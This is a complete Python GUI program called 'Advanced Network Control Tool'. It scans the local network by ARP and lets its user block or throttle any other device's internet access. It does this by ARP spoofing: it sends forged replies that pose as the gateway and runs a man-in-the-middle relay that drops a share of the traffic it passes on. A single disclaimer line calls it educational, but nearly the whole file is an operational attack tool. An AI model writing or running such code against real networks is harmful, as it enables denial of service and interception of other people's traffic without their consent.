import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, Toplevel
import threading
import socket
import time
import ipaddress
import random
import scapy.all as scapy
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
import netifaces
import platform
import subprocess
from functools import partial
import os
import sys

class NetworkControlTool:
    def __init__(self, root):
        self.root = root
        self.root.title("Advanced Network Control Tool")
        self.root.geometry("950x600")
        self.root.resizable(True, True)
        
        # Variables
        self.target_domain = tk.StringVar()
        self.spoof_ip = tk.StringVar()
        self.dns_server = tk.StringVar(value="8.8.8.8")  # Default DNS server
        self.scan_results = []
        self.is_scanning = False
        self.is_attacking = False
        self.blocked_devices = {}  # Dictionary to track blocked devices and their threads
        self.rate_limited_devices = {}  # Dictionary to track rate-limited devices
        self.gateway_mac = None
        self.gateway_ip = None
        self.button_frames = {}  # Store button frames for each device
        
        # Check if running with admin/root privileges
        self.check_privileges()
        
        self.setup_ui()
    
    def check_privileges(self):
        """Check if the script is running with admin/root privileges"""
        try:
            is_admin = False
            if platform.system() == "Windows":
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:  # Unix/Linux/Mac
                is_admin = os.geteuid() == 0
                
            if not is_admin:
                messagebox.showwarning("Insufficient Privileges", 
                    "This tool requires administrative privileges to function properly.\n\n"
                    "Some features may not work correctly. Please restart the application as administrator/root.")
        except:
            # If we can't determine, just show a general note
            messagebox.showinfo("Note", 
                "This tool works best with administrative privileges.\n"
                "If you experience issues, try running as administrator/root.")
    
    def setup_ui(self):
        # Main frame
        main_frame = ttk.Frame(self.root, padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Target section
        target_frame = ttk.LabelFrame(main_frame, text="Network Discovery", padding=10)
        target_frame.pack(fill=tk.X, pady=5)
        
        scan_button = ttk.Button(target_frame, text="Scan Local Network", command=self.start_scan)
        scan_button.pack(pady=5)
        
        # Scan results section with button frame
        scan_outer_frame = ttk.Frame(main_frame)
        scan_outer_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Left side - Treeview
        scan_frame = ttk.LabelFrame(scan_outer_frame, text="Devices Found", padding=10)
        scan_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Create treeview for scan results
        self.scan_tree = ttk.Treeview(scan_frame, columns=("ip", "hostname", "mac", "status"), show="headings")
        self.scan_tree.heading("ip", text="IP Address")
        self.scan_tree.heading("hostname", text="Device Name")
        self.scan_tree.heading("mac", text="MAC Address")
        self.scan_tree.heading("status", text="Status")
        self.scan_tree.column("ip", width=120)
        self.scan_tree.column("hostname", width=200)
        self.scan_tree.column("mac", width=150)
        self.scan_tree.column("status", width=100)
        self.scan_tree.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)
        
        # Add scrollbar to treeview
        scrollbar = ttk.Scrollbar(scan_frame, orient=tk.VERTICAL, command=self.scan_tree.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.scan_tree.configure(yscrollcommand=scrollbar.set)
        
        # Right side - Device controls
        controls_frame = ttk.LabelFrame(scan_outer_frame, text="Device Controls", padding=10)
        controls_frame.pack(side=tk.RIGHT, fill=tk.Y, padx=5, pady=0)
        
        # Instructions label
        ttk.Label(controls_frame, text="Select a device to control", wraplength=150).pack(pady=10)
        
        # Device info frame
        self.device_info_frame = ttk.LabelFrame(controls_frame, text="Selected Device", padding=5)
        self.device_info_frame.pack(fill=tk.X, pady=5)
        
        self.selected_device_label = ttk.Label(self.device_info_frame, text="None selected", wraplength=150)
        self.selected_device_label.pack(pady=5)
        
        # Control buttons frame
        control_buttons_frame = ttk.Frame(controls_frame)
        control_buttons_frame.pack(fill=tk.X, pady=10)
        
        # Internet control button
        self.block_button = ttk.Button(control_buttons_frame, text="Block Internet", 
                                      command=self.block_selected_device, state=tk.DISABLED)
        self.block_button.pack(fill=tk.X, pady=2)
        
        # Rate limit button
        self.limit_button = ttk.Button(control_buttons_frame, text="Limit Bandwidth", 
                                      command=self.limit_selected_device, state=tk.DISABLED)
        self.limit_button.pack(fill=tk.X, pady=2)
        
        # Bind selection event
        self.scan_tree.bind("<<TreeviewSelect>>", self.on_device_select)
        
        # Log section
        log_frame = ttk.LabelFrame(main_frame, text="Log", padding=10)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, height=8)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.config(state=tk.DISABLED)
        
        # Add disclaimer
        disclaimer = ttk.Label(main_frame, text="DISCLAIMER: This tool is for educational purposes only. Unauthorized use against real systems is illegal.", 
                               foreground="red", font=("Arial", 9, "bold"))
        disclaimer.pack(pady=5)
    
    def on_device_select(self, event):
        """Handle device selection in the treeview"""
        selected_items = self.scan_tree.selection()
        if not selected_items:
            # No selection
            self.selected_device_label.config(text="None selected")
            self.block_button.config(state=tk.DISABLED)
            self.limit_button.config(state=tk.DISABLED)
            return
        
        # Get the selected item
        item = selected_items[0]
        values = self.scan_tree.item(item, "values")
        ip = values[0]
        hostname = values[1]
        
        # Don't allow controlling the gateway
        if ip == self.gateway_ip:
            self.selected_device_label.config(text=f"Gateway: {ip}\n{hostname}\n(Cannot control gateway)")
            self.block_button.config(state=tk.DISABLED)
            self.limit_button.config(state=tk.DISABLED)
            return
        
        # Update the selected device info
        self.selected_device_label.config(text=f"IP: {ip}\nName: {hostname}")
        
        # Update button states and text based on current device status
        status = values[3]
        if status == "Blocked":
            self.block_button.config(text="Unblock Internet", state=tk.NORMAL)
            self.limit_button.config(state=tk.DISABLED)
        elif status.startswith("Limited"):
            self.block_button.config(text="Block Internet", state=tk.NORMAL)
            self.limit_button.config(text="Remove Limit", state=tk.NORMAL)
        else:  # Connected
            self.block_button.config(text="Block Internet", state=tk.NORMAL)
            self.limit_button.config(text="Limit Bandwidth", state=tk.NORMAL)
    
    def block_selected_device(self):
        """Block or unblock the selected device"""
        selected_items = self.scan_tree.selection()
        if not selected_items:
            return
            
        item = selected_items[0]
        values = self.scan_tree.item(item, "values")
        ip = values[0]
        mac = values[2]
        status = values[3]
        
        # Toggle block status
        if status == "Blocked":
            self.toggle_internet(item, ip, mac, True)  # Unblock
        else:
            self.toggle_internet(item, ip, mac, False)  # Block
        
        # Update device selection to refresh button states
        self.on_device_select(None)
    
    def limit_selected_device(self):
        """Limit bandwidth for the selected device"""
        selected_items = self.scan_tree.selection()
        if not selected_items:
            return
            
        item = selected_items[0]
        values = self.scan_tree.item(item, "values")
        ip = values[0]
        mac = values[2]
        status = values[3]
        
        if status.startswith("Limited"):
            # Remove limit
            self.remove_rate_limit(None, item, ip, mac)
        else:
            # Show limit dialog
            self.show_rate_limit_dialog(item, ip, mac)
        
        # Update device selection to refresh button states
        self.on_device_select(None)
    
    def log(self, message):
        """Add message to log widget"""
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\n")
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
    
    def get_gateway_info(self):
        """Get the gateway IP and MAC address"""
        try:
            # Get default gateway
            gateways = netifaces.gateways()
            if 'default' in gateways and netifaces.AF_INET in gateways['default']:
                self.gateway_ip = gateways['default'][netifaces.AF_INET][0]
                
                # Get gateway MAC address using ARP
                ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=self.gateway_ip), 
                                  timeout=2, verbose=0)
                if ans:
                    self.gateway_mac = ans[0][1].hwsrc
                    self.log(f"Gateway detected: {self.gateway_ip} ({self.gateway_mac})")
                    return True
                else:
                    self.log(f"Could not get MAC address for gateway {self.gateway_ip}")
            else:
                self.log("Could not detect default gateway")
            
            return False
        except Exception as e:
            self.log(f"Error detecting gateway: {str(e)}")
            return False
    
    def get_local_ip_range(self):
        """Get the local IP range for scanning"""
        try:
            # Get default gateway interface
            gateways = netifaces.gateways()
            default_gateway = gateways['default'][netifaces.AF_INET]
            default_interface = default_gateway[1]
            
            # Get interface addresses
            addresses = netifaces.ifaddresses(default_interface)
            ipinfo = addresses[netifaces.AF_INET][0]
            
            ip_address = ipinfo['addr']
            netmask = ipinfo['netmask']
            
            # Calculate network range
            ip_int = int.from_bytes(socket.inet_aton(ip_address), "big")
            mask_int = int.from_bytes(socket.inet_aton(netmask), "big")
            network_int = ip_int & mask_int
            network_ip = socket.inet_ntoa(network_int.to_bytes(4, "big"))
            
            # Count bits in netmask to get CIDR notation
            cidr = bin(mask_int).count('1')
            
            network_range = f"{network_ip}/{cidr}"
            self.log(f"Detected local network: {network_range}")
            return network_range
            
        except Exception as e:
            self.log(f"Error detecting local network: {str(e)}")
            # Fallback to a common private network range
            self.log("Using fallback network range: 192.168.1.0/24")
            return "192.168.1.0/24"
    
    def start_scan(self):
        """Start network scan in a separate thread"""
        if self.is_scanning:
            messagebox.showinfo("Info", "Scan already in progress")
            return
        
        # Clear previous results
        for item in self.scan_tree.get_children():
            self.scan_tree.delete(item)
        
        self.scan_results = []
        self.is_scanning = True
        
        # Start scan in a thread
        scan_thread = threading.Thread(target=self.perform_network_scan)
        scan_thread.daemon = True
        scan_thread.start()
        
        self.log("Starting network scan...")
    
    def perform_network_scan(self):
        """Perform actual network scan using ARP"""
        try:
            # First get gateway information
            if not self.get_gateway_info():
                self.log("Warning: Could not determine gateway. Some features may not work correctly.")
            
            ip_range = self.get_local_ip_range()
            self.log(f"Scanning network: {ip_range}")
            
            # Send ARP request for all hosts in the network
            arp = scapy.ARP(pdst=ip_range)
            ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC
            packet = ether/arp
            
            # Send and receive packets
            result = scapy.srp(packet, timeout=3, verbose=0)[0]
            
            # Process results
            devices = []
            for sent, received in result:
                # Skip the gateway (we'll add it separately)
                if received.psrc == self.gateway_ip:
                    continue
                    
                devices.append({'ip': received.psrc, 'mac': received.hwsrc})
            
            # Add gateway first if we found it
            if self.gateway_ip and self.gateway_mac:
                gateway_device = {'ip': self.gateway_ip, 'mac': self.gateway_mac}
                gateway_device['hostname'] = "Gateway Router"
                self.root.after(0, self.add_scan_result, gateway_device['ip'], 
                               gateway_device['hostname'], gateway_device['mac'])
            
            # Get hostnames for each device
            for device in devices:
                try:
                    # Try to get hostname
                    hostname = self.get_device_name(device['ip'], device['mac'])
                    device['hostname'] = hostname
                    
                    # Add to GUI with control buttons
                    self.root.after(0, self.add_scan_result, device['ip'], hostname, device['mac'])
                    
                except Exception as e:
                    device['hostname'] = "Unknown"
                    self.root.after(0, self.add_scan_result, device['ip'], "Unknown", device['mac'])
                    self.root.after(0, self.log, f"Error getting hostname for {device['ip']}: {str(e)}")
            
            if not devices and not (self.gateway_ip and self.gateway_mac):
                self.root.after(0, self.log, "No devices found on the network.")
            else:
                total_devices = len(devices) + (1 if self.gateway_ip and self.gateway_mac else 0)
                self.root.after(0, self.log, f"Scan completed. Found {total_devices} devices.")
                
        except Exception as e:
            self.root.after(0, self.log, f"Scan error: {str(e)}")
        finally:
            self.is_scanning = False
    
    def get_device_name(self, ip, mac):
        """Try to determine device name from IP address"""
        try:
            # Try to resolve hostname
            hostname = socket.getfqdn(ip)
            print(hostname)
            if hostname != ip:  # If resolution was successful
                return hostname.split('.')[0]  # Get the first part of the hostname
            
            # Try using NBT/NetBIOS for Windows networks
            if platform.system() == "Windows":
                try:
                    result = subprocess.check_output(f"nbtscan {ip}", shell=True, text=True, stderr=subprocess.DEVNULL)
                    if "NetBIOS Name" in result:
                        name_parts = result.split("NetBIOS Name")[1].strip().split()
                        if name_parts:
                            return name_parts[0]
                except:
                    pass
            
            # Try using vendor lookup from MAC address
            mac_prefix = mac.replace(':', '').upper()[0:6]
            vendors = {
                "FCFBFB": "Apple",
                "ACFDCE": "Apple",
                "9C30EB": "Apple",
                "78DD12": "Apple",
                "3C2EFF": "Apple",
                "707781": "Apple",
                "7CC537": "Apple",
                "001122": "Cisco",
                "E4C7D3": "Samsung",
                "8C4B59": "Samsung",
                "98F170": "Samsung",
                "F40F24": "Samsung",
                "94812E": "Samsung",
                "BC7289": "Samsung",
                "2C5089": "Samsung",
                "AC5A4E": "Samsung",
                "001DD8": "Microsoft",
                "281878": "Microsoft",
                "A81B5A": "Microsoft",
                "08018E": "Amazon",
                "909D7D": "Amazon",
                "FCA183": "Amazon",
                "6C5A34": "Google",
                "94EB2C": "Google",
                "A47733": "Google",
                "001A11": "Google",
                "F87394": "Lenovo",
                "60D9C7": "Lenovo",
                "6045BD": "Lenovo",
                "4027E4": "Lenovo",
                # Add more common vendor prefixes as needed
            }
            
            if mac_prefix in vendors:
                return f"{vendors[mac_prefix]} Device"
            
            # Try to determine if it's a router (but not the main gateway)
            # if self.is_likely_router(ip) and ip != self.gateway_ip:
            #     return "Secondary Router"
                
            # Default to generic name with last part of IP
            return f"Device-{ip.split('.')[-1]}"
            
        except Exception as e:
            return f"Device-{ip.split('.')[-1]}"
    
    def is_likely_router(self, ip):
        """Check if the IP is likely a router"""
        try:
            # Common router addresses
            last_octet = int(ip.split('.')[-1])
            if last_octet == 1 or last_octet == 254:
                return True
                
            # Try to connect to common router ports
            router_ports = [80, 443, 8080, 8443]
            for port in router_ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.1)
                    result = s.connect_ex((ip, port))
                    s.close()
                    if result == 0:  # Port is open
                        return True
                except:
                    pass
            return False
        except:
            return False
    
    def add_scan_result(self, ip, hostname, mac):
        """Add scan result to the treeview"""
        # Set initial status
        status = "Connected"
        
        # Create the item
        item_id = self.scan_tree.insert("", tk.END, values=(ip, hostname, mac, status))
        
        self.log(f"Found device: {ip} ({hostname})")
    
    def toggle_internet(self, item, ip, mac, enable=None):
        """Toggle internet access for a device using ARP spoofing"""
        if not self.gateway_ip or not self.gateway_mac:
            messagebox.showerror("Error", "Gateway information is not available. Cannot perform this action.")
            return
        
        # Determine current status if not specified
        if enable is None:
            values = self.scan_tree.item(item, "values")
            current_status = values[3]
            enable = current_status != "Connected"
        
        # Update the status in the treeview
        values = self.scan_tree.item(item, "values")
        new_values = (values[0], values[1], values[2], "Connected" if enable else "Blocked")
        self.scan_tree.item(item, values=new_values)
        
        if not enable:
            # Start blocking if not already blocking this device
            if ip not in self.blocked_devices:
                self.log(f"Blocking internet access for {ip}")
                
                # Stop rate limiting if active
                if ip in self.rate_limited_devices:
                    self.stop_rate_limiting(ip)
                
                # Start a new thread to keep sending ARP spoofing packets
                block_thread = threading.Thread(target=self.arp_spoof_thread, args=(ip, mac))
                block_thread.daemon = True
                self.blocked_devices[ip] = block_thread
                block_thread.start()
        else:
            # Stop blocking if currently blocking
            if ip in self.blocked_devices:
                self.log(f"Restoring internet access for {ip}")
                
                # Send correct ARP information to fix the device's ARP table
                self.restore_arp(ip, mac)
                
                # Remove from blocked devices
                self.blocked_devices.pop(ip, None)
    
    def show_rate_limit_dialog(self, item, ip, mac):
        """Show dialog with slider to set rate limit"""
        if ip in self.blocked_devices:
            messagebox.showinfo("Information", "Device is currently blocked. Unblock it first to apply rate limiting.")
            return
            
        # Create a toplevel window
        dialog = Toplevel(self.root)
        dialog.title(f"Rate Limit for {ip}")
        dialog.geometry("400x200")
        dialog.resizable(False, False)
        dialog.grab_set()  # Make it modal
        
        # Add content to the dialog
        ttk.Label(dialog, text=f"Set bandwidth limit for {ip}", font=("Arial", 12)).pack(pady=10)
        
        # Current rate if already limited
        current_rate = 0
        if ip in self.rate_limited_devices:
            current_rate = self.rate_limited_devices[ip]['rate']
        
        # Frame for slider
        slider_frame = ttk.Frame(dialog)
        slider_frame.pack(fill=tk.X, padx=20, pady=10)
        
        # Add labels for slider
        ttk.Label(slider_frame, text="Unlimited").pack(side=tk.LEFT)
        ttk.Label(slider_frame, text="56K Modem").pack(side=tk.RIGHT)
        
        # Variable to store slider value
        rate_var = tk.IntVar(value=current_rate)
        
        # Function to show the current value
        def show_value(val):
            value = int(float(val))
            if value == 0:
                limit_label.config(text="No Limit (Full Speed)")
            elif value <= 20:
                limit_label.config(text=f"Slight Limit: {100-value}% of normal speed")
            elif value <= 50:
                limit_label.config(text=f"Moderate Limit: {100-value}% of normal speed")
            elif value <= 80:
                limit_label.config(text=f"Heavy Limit: {100-value}% of normal speed")
            else:
                limit_label.config(text=f"Severe Limit: {100-value}% of normal speed")
        
        # Create slider
        slider = ttk.Scale(
            dialog, 
            from_=0, 
            to=95,  # Max 95% reduction
            orient=tk.HORIZONTAL, 
            length=350,
            variable=rate_var,
            command=show_value
        )
        slider.pack(padx=20, pady=5)
        
        # Label to show current value
        limit_label = ttk.Label(dialog, text="No Limit (Full Speed)")
        limit_label.pack(pady=5)
        
        # Update the label with the initial value
        show_value(current_rate)
        
        # Buttons frame
        button_frame = ttk.Frame(dialog)
        button_frame.pack(fill=tk.X, padx=20, pady=10)
        
        # Apply button
        apply_btn = ttk.Button(
            button_frame, 
            text="Apply Limit", 
            command=lambda: self.apply_rate_limit(dialog, item, ip, mac, rate_var.get())
        )
        apply_btn.pack(side=tk.LEFT, padx=5)
        
        # Remove limit button
        remove_btn = ttk.Button(
            button_frame, 
            text="Remove Limit", 
            command=lambda: self.remove_rate_limit(dialog, item, ip, mac)
        )
        remove_btn.pack(side=tk.LEFT, padx=5)
        
        # Cancel button
        cancel_btn = ttk.Button(
            button_frame, 
            text="Cancel", 
            command=dialog.destroy
        )
        cancel_btn.pack(side=tk.RIGHT, padx=5)
    
    def apply_rate_limit(self, dialog, item, ip, mac, rate):
        """Apply rate limiting to a device"""
        if rate == 0:
            self.remove_rate_limit(dialog, item, ip, mac)
            return
            
        # Update the status in the treeview
        values = self.scan_tree.item(item, "values")
        new_values = (values[0], values[1], values[2], f"Limited ({100-rate}%)")
        self.scan_tree.item(item, values=new_values)
        
        # Stop any existing rate limiting for this device
        if ip in self.rate_limited_devices:
            self.stop_rate_limiting(ip)
        
        self.log(f"Applying bandwidth limit to {ip}: {100-rate}% of normal speed")
        
        # Start a new thread to handle rate limiting
        rate_thread = threading.Thread(target=self.rate_limit_thread, args=(ip, mac, rate))
        rate_thread.daemon = True
        
        self.rate_limited_devices[ip] = {
            'thread': rate_thread,
            'rate': rate,
            'active': True
        }
        
        rate_thread.start()
        
        # Close the dialog
        if dialog:
            dialog.destroy()
    
    def remove_rate_limit(self, dialog, item, ip, mac):
        """Remove rate limiting from a device"""
        # Update the status in the treeview
        values = self.scan_tree.item(item, "values")
        new_values = (values[0], values[1], values[2], "Connected")
        self.scan_tree.item(item, values=new_values)
        
        # Stop rate limiting
        if ip in self.rate_limited_devices:
            self.stop_rate_limiting(ip)
            self.log(f"Removed bandwidth limit from {ip}")
        
        # Close the dialog
        if dialog:
            dialog.destroy()
    
    def stop_rate_limiting(self, ip):
        """Stop rate limiting for a device"""
        if ip in self.rate_limited_devices:
            self.rate_limited_devices[ip]['active'] = False
            # Wait a moment for the thread to notice and exit
            time.sleep(0.2)
            self.rate_limited_devices.pop(ip, None)

    def rate_limit_thread(self, target_ip, target_mac, rate_limit):
        """Thread to handle rate limiting for a device"""
        try:
            # Convert rate_limit (0-100) to packet drop probability (0.0-1.0)
            drop_probability = rate_limit / 1000.0

            # Get our own MAC address for ARP spoofing
            my_mac = scapy.get_if_hwaddr(scapy.conf.iface)

            # Prepare ARP packets for spoofing
            spoof_target = scapy.ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=self.gateway_ip
            )

            spoof_gateway = scapy.ARP(
                op=2,
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                psrc=target_ip
            )

            # Stats tracking
            packets_total = 0
            packets_dropped = 0
            last_log_time = time.time()
            last_spoof_time = time.time()

            # Use a more efficient packet forwarding approach
            def packet_callback(packet):
                nonlocal packets_total, packets_dropped

                # Only process IP packets with correct MAC addresses
                if scapy.IP in packet and scapy.Ether in packet:
                    packets_total += 1

                    # Fast path for packet forwarding
                    src_mac = packet[scapy.Ether].src
                    dst_mac = packet[scapy.Ether].dst

                    # Check if we should drop this packet
                    if random.random() < drop_probability:
                        packets_dropped += 1
                        return  # Drop packet

                    # Determine forwarding direction and rewrite MAC addresses
                    if src_mac == target_mac and dst_mac == my_mac:
                        # Target to gateway
                        packet[scapy.Ether].src = my_mac
                        packet[scapy.Ether].dst = self.gateway_mac
                        scapy.sendp(packet, verbose=0, iface=scapy.conf.iface)
                    elif src_mac == self.gateway_mac and dst_mac == my_mac:
                        # Gateway to target
                        packet[scapy.Ether].src = my_mac
                        packet[scapy.Ether].dst = target_mac
                        scapy.sendp(packet, verbose=0, iface=scapy.conf.iface)

            # Start packet forwarding in another thread
            sniffer_thread = threading.Thread(
                target=lambda: scapy.sniff(
                    filter=f"host {target_ip} and (ether dst {my_mac} or ether src {target_mac})",
                    prn=packet_callback,
                    store=False
                )
            )
            sniffer_thread.daemon = True
            sniffer_thread.start()

            # Create a separate thread for ARP spoofing to avoid blocking
            def arp_spoof_loop():
                nonlocal last_spoof_time
                while target_ip in self.rate_limited_devices and self.rate_limited_devices[target_ip]['active']:
                    current_time = time.time()
                    # Send ARP spoofs every 3 seconds (less frequently)
                    if current_time - last_spoof_time >= 3:
                        # Use send instead of sendp for better performance
                        scapy.send([spoof_target, spoof_gateway], verbose=0)
                        last_spoof_time = current_time
                    time.sleep(0.1)  # Short sleep to reduce CPU usage

            spoof_thread = threading.Thread(target=arp_spoof_loop)
            spoof_thread.daemon = True
            spoof_thread.start()

            # Main monitoring loop
            while target_ip in self.rate_limited_devices and self.rate_limited_devices[target_ip]['active']:
                # Log statistics every 5 seconds
                current_time = time.time()
                if current_time - last_log_time >= 5:
                    if packets_total > 0:
                        drop_rate = (packets_dropped / packets_total) * 100
                        self.root.after(0, self.log,
                                    f"Rate limiting {target_ip}: {packets_total} packets processed, "
                                    f"{packets_dropped} dropped ({drop_rate:.1f}%)")
                    last_log_time = current_time
                    # Reset counters
                    packets_total = 0
                    packets_dropped = 0

                time.sleep(1)

            # Restore normal ARP when done
            self.restore_arp(target_ip, target_mac)

        except Exception as e:
            self.root.after(0, self.log, f"Rate limiting error for {target_ip}: {str(e)}")
        finally:
            # Make sure we restore ARP
            try:
                self.restore_arp(target_ip, target_mac)
            except:
                pass
    
    def arp_spoof_thread(self, target_ip, target_mac):
        """Thread that continuously sends ARP spoofing packets"""
        try:
            # Create ARP packets to spoof the gateway to the target
            # Tell the target that we are the gateway
            spoof_packet = scapy.ARP(
                op=2,  # ARP Reply
                pdst=target_ip,  # Target IP
                hwdst=target_mac,  # Target MAC
                psrc=self.gateway_ip,  # Pretend to be the gateway
                # hwsrc is automatically set to your MAC
            )
            
            # Keep sending packets until this IP is removed from blocked_devices
            while target_ip in self.blocked_devices:
                scapy.send(spoof_packet, verbose=0)
                time.sleep(1)  # Send every second
                
        except Exception as e:
            self.log(f"Error in ARP spoofing thread for {target_ip}: {str(e)}")
    
    def restore_arp(self, target_ip, target_mac):
        """Restore the correct ARP information to the target"""
        try:
            # Create ARP packet with correct information
            restore_packet = scapy.ARP(
                op=2,  # ARP Reply
                pdst=target_ip,  # Target IP
                hwdst=target_mac,  # Target MAC
                psrc=self.gateway_ip,  # Gateway IP
                hwsrc=self.gateway_mac  # Gateway MAC
            )
            
            # Send the correct information several times to ensure it takes effect
            for _ in range(5):
                scapy.send(restore_packet, verbose=0)
                time.sleep(0.1)
                
            self.log(f"ARP restoration sent to {target_ip}")
            
        except Exception as e:
            self.log(f"Error restoring ARP for {target_ip}: {str(e)}")
        
    def on_closing(self):
        """Clean up when closing the application"""
        # Restore ARP for all blocked devices
        for ip in list(self.blocked_devices.keys()):
            # Find MAC address
            for item in self.scan_tree.get_children():
                values = self.scan_tree.item(item, "values")
                if values[0] == ip:
                    mac = values[2]
                    self.restore_arp(ip, mac)
                    break
        
        # Stop rate limiting
        for ip in list(self.rate_limited_devices.keys()):
            self.stop_rate_limiting(ip)
            # Find MAC address
            for item in self.scan_tree.get_children():
                values = self.scan_tree.item(item, "values")
                if values[0] == ip:
                    mac = values[2]
                    self.restore_arp(ip, mac)
                    break
        
        # Close the window
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = NetworkControlTool(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    root.mainloop()